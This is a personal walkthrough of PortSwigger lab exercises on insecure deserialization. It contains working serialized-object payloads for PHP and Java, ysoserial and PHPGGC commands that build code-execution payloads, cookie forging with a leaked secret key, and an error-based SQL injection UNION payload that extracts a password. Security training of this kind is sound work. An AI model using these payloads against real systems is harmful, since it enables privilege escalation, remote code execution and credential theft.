### Lab: Modifying serialized objects
This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result

Exploiting:
- Log in using your own credentials. Notice that the post-login GET /my-account request contains a session cookie that appears to be URL and Base64-encoded.
- Use Burp's Inspector panel to study the request in its decoded form. Notice that the cookie is in fact a serialized PHP object. The admin attribute contains b:0, indicating the boolean value false. Send this request to Burp Repeater.
- In Burp Repeater, use the Inspector to examine the cookie again and change the value of the admin attribute to b:1. Click "Apply changes". The modified object will automatically be re-encoded and updated in the request.
- Send the request. Notice that the response now contains a link to the admin panel at /admin, indicating that you have accessed the page with admin privileges. 
- Change the path of your request to /admin and resend it. Notice that the /admin page contains links to delete specific user accounts. 

### Modifying data types
When working directly with binary formats, we recommend using the Hackvertor extension, available from the BApp store. With Hackvertor, you can modify the serialized data as a string, and it will automatically update the binary data, adjusting the offsets accordingly. This can save you a lot of manual effort. 

### Lab: Modifying serialized data types
In cookie we used to have:
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"snsrofncof3jhf5zfgpftd0vyhdsgh3h";}
```
But we change it to:
```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```
access_token is now equal to 0 because php loose comparison (==) is weird.

php explanation:
```bash
$login = unserialize($_COOKIE)
if ($login['password'] == $password) {
// log in successfully
}
```
Let's say an attacker modified the password attribute so that it contained the integer 0 instead of the expected string. As long as the stored password does not start with a number, the condition would always return true, enabling an authentication bypass. Note that this is only possible because deserialization preserves the data type. If the code fetched the password from the request directly, the 0 would be converted to a string and the condition would evaluate to false. 

### Lab: Using application functionality to exploit insecure deserialization
To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos's home directory.

- In Burp Repeater, study the session cookie using the Inspector panel. Notice that the serialized object has an avatar_link attribute, which contains the file path to your avatar.
- Edit the serialized data so that the avatar_link points to /home/carlos/morale.txt. Remember to update the length indicator. The modified attribute should look like this:
- s:11:"avatar_link";s:23:"/home/carlos/morale.txt"
- Click "Apply changes". The modified object will automatically be re-encoded and updated in the request.
- Change the request line to POST /my-account/delete and send the request. Your account will be deleted, along with Carlos's morale.txt file. 

### Magic methods
Some languages have magic methods that are invoked automatically during the deserialization process. For example, PHP's unserialize() method looks for and invokes an object's __wakeup() magic method.

In Java deserialization, the same applies to the ObjectInputStream.readObject() method, which is used to read data from the initial byte stream and essentially acts like a constructor for "re-initializing" a serialized object. However, Serializable classes can also declare their own readObject() method as follows: 
```bash
private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException
{
    // implementation
}
```
A readObject() method declared in exactly this way acts as a magic method that is invoked during deserialization. This allows the class to control the deserialization of its own fields more closely.

You should pay close attention to any classes that contain these types of magic methods. They allow you to pass data from a serialized object into the website's code before the object is fully deserialized. This is the starting point for creating more advanced exploits. 

### Lab: Arbitrary object injection in PHP
This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the `morale.txt` file from Carlos's home directory. You will need to obtain source code access to solve this lab. 

Solution:
- Log in to your own account and notice the session cookie contains a serialized PHP object. 
-  From the site map, notice that the website references the file /libs/CustomTemplate.php. Right-click on the file and select "Send to Repeater".
- In Burp Repeater, notice that you can read the source code by appending a tilde (~) to the filename in the request line. (You can sometimes read source code by appending a tilde (~) to a filename to retrieve an editor-generated backup file)
```
GET /libs/CustomTemplate.php~ HTTP/2
```
Result:
```bash
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```
- In the source code, notice the CustomTemplate class contains the __destruct() magic method. This will invoke the unlink() method on the lock_file_path attribute, which will delete the file on this path. 
- In Burp Decoder, use the correct syntax for serialized PHP data to create a CustomTemplate object with the lock_file_path attribute set to /home/carlos/morale.txt. Make sure to use the correct data type labels and length indicators. The final object should look like this: 
```bash
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```
- Base64 and URL-encode this object and save it to your clipboard.
- Send a request containing the session cookie to Burp Repeater.
- In Burp Repeater, replace the session cookie with the modified one in your clipboard.
- Send the request. The __destruct() magic method is automatically invoked and will delete Carlos's file. 

### Lab: Exploiting Java deserialization with Apache Commons
This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don't have source code access, you can still exploit this lab using pre-built gadget chains.

To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos's home directory. 

Solution:
- Log in to your own account and observe that the session cookie contains a serialized Java object. Send a request containing your session cookie to Burp Repeater.
- Git clone the "ysoserial" tool and execute the following command. This generates a Base64-encoded serialized object containing your payload: 
```bash
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial
docker build -t ysoserial:latest .
```
```bash
docker run ysoserial:latest CommonsCollections4 'rm /home/carlos/morale.txt' | base64
```
- In Burp Repeater, replace your session cookie with the malicious one you just created. Select the entire cookie and then **URL-encode it**.
- Send the request to solve the lab.


### Lab: Exploiting PHP deserialization with a pre-built gadget chain
This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don't have source code access, you can still exploit this lab's insecure deserialization using pre-built gadget chains.

To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the morale.txt file from Carlos's home directory. 

Solution:
- Log in and send a request containing your session cookie to Burp Repeater. Highlight the cookie and look at the Inspector panel.
- Notice that the cookie contains a Base64-encoded token, signed with a SHA-1 HMAC hash.
- Copy the decoded cookie from the Inspector and paste it into Decoder.
- In Decoder, highlight the token and then select Decode as > Base64. Notice that the token is actually a serialized PHP object. 
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"lv7yneldrtpr63s0h5f8twl969nnhmxw";}
```
- In Burp Repeater, observe that if you try sending a request with a modified cookie, an exception is raised because the digital signature no longer matches. 
```bash
<h4>Internal Server Error: Symfony Version: 4.3.6</h4>
<p class=is-warning>PHP Fatal error:  Uncaught Exception: Signature does not match session in /var/www/index.php:7
Stack trace:
#0 {main}
thrown in /var/www/index.php on line 7</p>
```
- However, you should notice that: 
  - A developer comment (on the home page) discloses the location of a debug file at /cgi-bin/phpinfo.php.
  - The error message reveals that the website is using the Symfony 4.3.6 framework.
- Request the /cgi-bin/phpinfo.php file in Burp Repeater and observe that it leaks some key information about the website, including the SECRET_KEY environment variable. Save this key; you'll need it to sign your exploit later. 
- Use PHPGGC:
```bash
git clone https://github.com/ambionics/phpggc.git
docker build -t phpggc:latest .
docker run phpggc:latest Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64
```
- You now need to construct a valid cookie containing this malicious object and sign it correctly using the secret key you obtained earlier. You can use the following PHP script to do this. Before running the script, you just need to make the following changes:
- Assign the object you generated in PHPGGC to the `objectGeneratedByPhpGGC` variable.
- Assign the secret key that you copied from the phpinfo.php file to the `leakedSecretKeyFromPhpInfo` variable.
- run `./sha1_cookie.go` file.
- This will output a valid, signed cookie to the console. 
- In Burp Repeater, replace your session cookie with the malicious one you just created, then send the request to solve the lab. 


### Lab: Exploiting Ruby deserialization using a documented gadget chain
Ruby is needed...

### Lab: Developing a custom gadget chain for Java deserialization
This lab uses a serialization-based session mechanism. If you can construct a suitable gadget chain, you can exploit this lab's insecure deserialization to obtain the administrator's password.

To solve the lab, gain access to the source code and use it to construct a gadget chain to obtain the administrator's password. Then, log in as the administrator and delete carlos. 

Hint:
If you don't already have a Java environment set up, you can compile and execute the program using a browser-based IDE, such as `repl.it` (https://replit.com/@portswigger/java-serialization-example#Main.java)

#### Solution:
Identify the vulnerability
- Log in to your own account and notice the session cookie contains a serialized Java - object.
- From the site map, notice that the website references the file /backup/AccessTokenUser.- java. You can successfully request this file in Burp Repeater.
- Navigate upward to the /backup directory and notice that it also contains a ProductTemplate.java file.
Notice that the ProductTemplate.readObject() method passes the template's id attribute into an SQL statement.
- Based on the leaked source code, write a small Java program that instantiates a ProductTemplate with an arbitrary ID, serializes it, and then Base64-encodes it. 
- Use your Java program to create a ProductTemplate with the id set to a single apostrophe. Copy the Base64 string and submit it in a request as your session cookie. The error message confirms that the website is vulnerable to Postgres-based SQL injection via this deserialized object. 

During the first attempt I got the err: java.io.EOFException
It happened because in the `ProductTemplate` class that I created, I forgot to include `static final long serialVersionUID = 1L;`. 

Then I fixed it and I got another err: `java.lang.ClassNotFoundException: ProductTemplate` 
It happened because I did not include `package data.productcatalog;` at the top of the `ProductTemplate.java` file (I also needed to create `data` and `productcatalog` folders and put `ProductTemplate.java` inside them).

I fixed it and finally I got: 
```
java.io.IOException: org.postgresql.util.PSQLException: Unterminated string literal started at position 36 in SQL SELECT * FROM products WHERE id = &apos;&apos;&apos; LIMIT 1. Expected  char
```

Extract the password:
- Make changes in your Java file like you did in the previous step, recompile it, and run it again before pasting the new value into your session cookie.
- Perform a simple, error-based UNION attack:
```bash
ProductTemplate pT = new ProductTemplate("' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users--");
```
And we got back the err: 
```
java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type numeric: &quot;91cxmrcwtn15dbmfx41d&quot;
```
It contains the password

